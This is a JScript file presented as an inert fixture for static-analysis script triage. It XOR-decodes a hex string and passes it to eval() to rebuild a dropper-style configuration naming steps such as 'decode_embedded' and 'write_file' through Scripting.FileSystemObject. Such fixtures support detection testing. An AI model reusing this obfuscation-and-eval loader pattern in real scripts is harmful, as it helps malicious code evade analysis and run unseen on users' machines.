// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_753e2877(v_a19c) {
  var keyBytes = [219,142,14,166,97];
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ keyBytes[i % keyBytes.length]); }
  return v_b27e;
}
function recover_21de6931() {
  // configuration reconstruction
  var packedText = "a0:ac:7d:d2:04:ab:fd:2c:9c:3a:f9:ea:6b:c5:0e:bf:eb:51:c3:0c:b9:eb:6a:c2:04:bf:ac:22:84:16:a9:e7:7a:c3:3e:bd:e7:62:c3:43:86:a2:2c:c7:05:ba:fe:7a:c3:13:f9:b4:2c:f5:02:a9:e7:7e:d2:08:b5:e9:20:e0:08:b7:eb:5d:df:12:af:eb:63:e9:03:b1:eb:6d:d2:43:f7:ac:78:c7:0d:ae:eb:7d:84:5b:a0:ac:6d:c7:0c:ab:ef:67:c1:0f:84:e7:6a:84:5b:f9:ed:6f:cb:11:ba:e7:69:c8:4c:ba:ea:3d:9f:57:ba:b9:38:97:52:f9:a2:2c:c0:08:b7:eb:51:d6:00:af:e6:2c:9c:43:98:b4:52:fa:34:a8:eb:7c:d5:3d:87:de:7b:c4:0d:b2:ed:52:fa:29:ae:e0:7a:d4:04:a8:fd:42:c7:03:87:d2:7d:d2:00:bc:eb:23:c7:05:e8:b7:38:c7:56:ed:bf:3d:88:05:ba:fa:2c:db:4d:f9:fd:7a:c7:06:be:cd:61:d3:0f:af:ac:34:94:1c";
  var packedParts = packedText.split(":");
  var v_a19c = [];
  for (var hi = 0; hi < packedParts.length; hi++) { v_a19c.push(parseInt(packedParts[hi], 16)); }
  var v_f602 = ["north", "south"].join(":");
  var v_b27e = [];
  for (var pass = 0; pass < 1; pass++) { v_b27e = decode_753e2877.apply(null, [v_a19c]); }
  var v_c304;
  v_c304 = v_b27e.length ? String.fromCharCode(v_b27e[0]) : "";
  for (var bi = 1; bi < v_b27e.length; bi++) { v_c304 = v_c304.concat(String.fromCharCode(v_b27e[bi])); }
  return v_c304;
  // end reconstruction
}
function inspect_5ef4f365() {
  var v_d41a = eval("(" + recover_21de6931.apply(null, []) + ")");
  var v_e598 = new Object();
  v_e598.steps = v_d41a.steps;
  v_e598["adapter"] = v_d41a["adapter"];
  v_e598.values = v_d41a.values;
  v_e598["stageCount"] = v_d41a["stageCount"];
  return v_e598;
}
